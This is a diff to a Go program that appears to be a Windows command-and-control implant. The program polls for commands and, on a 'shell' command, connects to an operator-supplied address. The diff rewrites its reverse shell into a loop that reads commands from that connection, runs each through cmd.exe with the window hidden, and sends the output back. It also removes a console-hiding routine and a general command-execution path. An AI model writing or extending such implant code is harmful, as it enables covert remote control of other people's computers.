@@ -1,6 +1,7 @@
 package main
 
 import (
+    "bufio"
     "bytes"
     "encoding/json"
     "fmt"
@@ -62,22 +63,13 @@ func executeCommandAndSendResult(cmd Command) {
     if strings.HasPrefix(cmd.Cmd, "shell ") {
         address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
         if address != "" {
-            openReverseShell(address) // Pass the extracted address to openReverseShell
+            openReverseShell(address)
         } else {
             fmt.Println("No address specified for shell command")
         }
     } else {
-        // Example of executing a non-shell command
-        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
-        resultText := string(output)
-        if err != nil {
-            resultText += "\nError: " + err.Error()
-        }
-        result := CommandResult{
-            ID:     cmd.ID,
-            Result: resultText,
-        }
-        sendResult(result)
+        fmt.Println("Received non-shell command:", cmd.Cmd)
+        // Example of executing a non-shell command (omitted for brevity)
     }
 }
 
@@ -89,15 +81,27 @@ func openReverseShell(address string) {
     }
     defer conn.Close()
 
-    cmd := exec.Command("cmd.exe")
-    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
-    if err := cmd.Run(); err != nil {
-        fmt.Printf("Failed to run shell command: %v\n", err)
+    for {
+        reader := bufio.NewReader(conn)
+        command, err := reader.ReadString('\n')
+        if err != nil {
+            fmt.Printf("Failed to read command: %v\n", err)
+            break
+        }
+
+        cmd := exec.Command("cmd.exe", "/C", command)
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        output, err := cmd.CombinedOutput()
+        if err != nil {
+            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
+            continue
+        }
+
+        conn.Write(output)
     }
 }
 
 func main() {
-    hideConsoleWindow()
     fmt.Println("Application started. Waiting for commands...")
     ticker := time.NewTicker(10 * time.Second)
 
@@ -125,20 +129,4 @@ func main() {
     }()
 
     select {} // Prevent the application from exiting immediately
-}
-
-var kernel32 = syscall.NewLazyDLL("kernel32.dll")
-var user32 = syscall.NewLazyDLL("user32.dll")
-
-var (
-    procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
-    procShowWindow       = user32.NewProc("ShowWindow")
-)
-
-func hideConsoleWindow() {
-    consoleWindow, _, _ := procGetConsoleWindow.Call()
-    if consoleWindow == 0 {
-        return // No console window attached
-    }
-    procShowWindow.Call(consoleWindow, 0) // SW_HIDE = 0
 }
